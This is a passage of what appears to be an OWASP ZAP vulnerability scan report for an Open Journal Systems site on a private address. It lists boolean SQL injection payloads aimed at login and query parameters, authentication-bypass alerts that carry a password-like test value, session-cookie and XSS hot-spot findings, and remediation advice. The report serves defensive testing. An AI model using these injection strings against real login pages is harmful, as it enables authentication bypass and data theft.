The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `remember`
  * Attack: `1' AND '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1' AND '1'='1' -- ] and [1' AND '1'='2' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: ` AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [ AND 1=1 -- ] and [ AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: `" AND "1"="1" -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [" AND "1"="1" -- ] and [" AND "1"="2" -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: `' AND '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [' AND '1'='1' -- ] and [' AND '1'='2' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `username`
  * Attack: `admin' AND '1'='1`
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [admin' AND '1'='1] and [admin' AND '1'='2]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/update-query-note-files%3FsubmissionId=869&queryId=1016&noteId=1040-2&stageId=1&fileStage=18&assocType=520&assocId=1038&representationId=
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/update-query-note-files (assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)(csrfToken,selectedFiles[],submitFormButton)`
  * Method: `POST`
  * Parameter: `noteId`
  * Attack: `1040-2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [1040-2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1018-2&wasNew=1&submissionId=869&stageId=1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[])`
  * Method: `POST`
  * Parameter: `queryId`
  * Attack: `1018-2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [1018-2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=2032%252F2&wasNew=1&submissionId=869&stageId=1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[])`
  * Method: `POST`
  * Parameter: `queryId`
  * Attack: `2032/2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [2032/2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1016&wasNew=1&submissionId=869&stageId=1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[])`
  * Method: `POST`
  * Parameter: `users[0]`
  * Attack: `1 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1 AND 1=1 -- ] and [1 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1016&wasNew=1&submissionId=869&stageId=1+AND+1%253D1+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[],users[])`
  * Method: `POST`
  * Parameter: `stageId`
  * Attack: `1 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1 AND 1=1 -- ] and [1 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: `/ojs/index.php/jtkc/workflow/access/869 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [/ojs/index.php/jtkc/workflow/access/869 AND 1=1 -- ] and [/ojs/index.php/jtkc/workflow/access/869 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`


Instances: 47

### Solution

Do not trust client side input, even if there is client side validation in place.
In general, type check all data on the server side.
If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'
If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.
If database Stored Procedures can be used, use them.
Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!
Do not create dynamic SQL queries using simple string concatenation.
Escape all data received from the client.
Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.
Apply the principle of least privilege by using the least privileged database user possible.
In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.
Grant the minimum database access that is necessary for the application.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)


#### CWE Id: [ 89 ](https://cwe.mitre.org/data/definitions/89.html)


#### WASC Id: 19

#### Source ID: 1

### [ SQL Injection - Authentication Bypass ](https://www.zaproxy.org/docs/alerts/40018/)



##### High (Medium)

### Description

SQL injection may be possible on a login page, potentially allowing the application's authentication mechanism to be bypassed

* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `password`
  * Attack: `Admin@123 AND 1=1 -- `
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `remember`
  * Attack: `1" AND "1"="1" -- `
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `remember`
  * Attack: `1' AND '1'='1' -- `
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: ` AND 1=1 -- `
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: `" AND "1"="1" -- `
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `source`
  * Attack: `' AND '1'='1' -- `
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `username`
  * Attack: `admin' AND '1'='1`
  * Evidence: ``
  * Other Info: ``


Instances: 7

### Solution

Do not trust client side input, even if there is client side validation in place.
In general, type check all data on the server side.
If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?'
If the application uses ASP, use ADO Command Objects with strong type checking and parameterized queries.
If database Stored Procedures can be used, use them.
Do *not* concatenate strings into queries in the stored procedure, or use 'exec', 'exec immediate', or equivalent functionality!
Do not create dynamic SQL queries using simple string concatenation.
Escape all data received from the client.
Apply an 'allow list' of allowed characters, or a 'deny list' of disallowed characters in user input.
Apply the principle of least privilege by using the least privileged database user possible.
In particular, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.
Grant the minimum database access that is necessary for the application.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)


#### CWE Id: [ 89 ](https://cwe.mitre.org/data/definitions/89.html)


#### WASC Id: 19

#### Source ID: 1

### [ Authentication Request Identified ](https://www.zaproxy.org/docs/alerts/10111/)



##### Informational (High)

### Description

The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to "Auto-Detect" then this rule will change the authentication to match the request identified.

* URL: http://10.34.100.181/ojs/index.php/jtkc/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `username`
  * Attack: ``
  * Evidence: `password`
  * Other Info: `userParam=username
userValue=admin
passwordParam=password
referer=http://10.34.100.181/ojs/index.php/jtkc/login?source=%2Fojs%2Findex.php%2Fjtkc%2Fworkflow%2Faccess%2F869
csrfToken=csrfToken`


Instances: 1

### Solution

This is an informational alert rather than a vulnerability and so there is nothing to fix.

### Reference


* [ https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/ ](https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/)



#### Source ID: 3

### [ Session Management Response Identified ](https://www.zaproxy.org/docs/alerts/10112/)



##### Informational (Medium)

### Description

The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to "Auto-Detect" then this rule will change the session management to use the tokens identified.

* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/article-galleys/article-galley-grid/fetch-grid%3FsubmissionId=869&publicationId=869&_=1775676740347
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/article-galleys/article-galley-grid/fetch-grid (_,publicationId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1&fileStage=18&assocType=520&assocId=1038&representationId=&_=1775676740354
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016&noteId=1038&representationId=&_=1775676740355
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FqueryId=1016&noteId=1038&submissionId=869&stageId=1&_=1775676740352
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,noteId,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016&noteId=1038&representationId=&_=1775676740353
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/submission/editor-submission-details-files-grid/fetch-grid%3FsubmissionId=869&stageId=1&_=1775676740344
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/submission/editor-submission-details-files-grid/fetch-grid (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/add-query%3FsubmissionId=869&stageId=1&_=1775676740351
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/add-query (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-grid%3FsubmissionId=869&stageId=1&_=1775676740345
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-grid (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-row%3FsubmissionId=869&stageId=1&rowId=1016&_=1775676740360
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-row (_,rowId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/participants%3FqueryId=1000&submissionId=869&stageId=1&_=1775676740349
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/participants (_,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/read-query%3FsubmissionId=869&stageId=1&queryId=1000&_=1775676740348
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/read-query (_,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/query-notes-grid/fetch-grid%3FqueryId=1000&submissionId=869&stageId=1&_=1775676740350
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/query-notes-grid/fetch-grid (_,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/author/author-grid/fetch-grid%3FsubmissionId=869&publicationId=869&_=1775676740346
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/author/author-grid/fetch-grid (_,publicationId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/stage-participant/stage-participant-grid/fetch-grid%3FsubmissionId=869&stageId=1&_=1775676740343
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/stage-participant/stage-participant-grid/fetch-grid (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/tab/workflow/workflow-tab/fetch-tab%3FsubmissionId=869&stageId=1&_=1775676740341
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/tab/workflow/workflow-tab/fetch-tab (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/notification/fetchNotification%3F_=1775676740339
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/notification/fetchNotification (_)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/access/869
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/access/869`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/editorDecisionActions%3FsubmissionId=869&stageId=1&contextId=submission&_=1775676740342
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/editorDecisionActions (_,contextId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/index/869/1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/index/869/1`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar%3FsubmissionId=869&stageId=1&contextId=submission&_=1775676740340
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar (_,contextId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/update-query-note-files%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1&fileStage=18&assocType=520&assocId=1038&representationId=
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/update-query-note-files (assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)(csrfToken,selectedFiles[],submitFormButton)`
  * Method: `POST`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1016&wasNew=1&submissionId=869&stageId=1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[])`
  * Method: `POST`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1016&wasNew=1&submissionId=869&stageId=1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[],users[])`
  * Method: `POST`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`
* URL: http://10.34.100.181/ojs/index.php/jtkc/notification/fetchNotification
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/notification/fetchNotification`
  * Method: `POST`
  * Parameter: `OJSSID`
  * Attack: ``
  * Evidence: `OJSSID`
  * Other Info: `cookie:OJSSID`


Instances: 25

### Solution

This is an informational alert rather than a vulnerability and so there is nothing to fix.

### Reference


* [ https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id/ ](https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id/)



#### Source ID: 3

### [ User Controllable HTML Element Attribute (Potential XSS) ](https://www.zaproxy.org/docs/alerts/10031/)



##### Informational (Low)

### Description

This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.

* URL: http://10.34.100.181/ojs/index.php/jtkc/login%3Fsource=%252Fojs%252Findex.php%252Fjtkc%252Fworkflow%252Faccess%252F869
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/login (source)`
  * Method: `GET`
  * Parameter: `source`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

http://10.34.100.181/ojs/index.php/jtkc/login?source=%2Fojs%2Findex.php%2Fjtkc%2Fworkflow%2Faccess%2F869

appears to include user input in:
a(n) [input] tag [value] attribute

The user input found was:
source=/ojs/index.php/jtkc/workflow/access/869

The user-controlled value was:
/ojs/index.php/jtkc/workflow/access/869`


Instances: 1

### Solution

Validate all input and sanitize output it before writing to any HTML attributes.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


#### CWE Id: [ 20 ](https://cwe.mitre.org/data/definitions/20.html)


#### WASC Id: 20

#### Source ID: 3


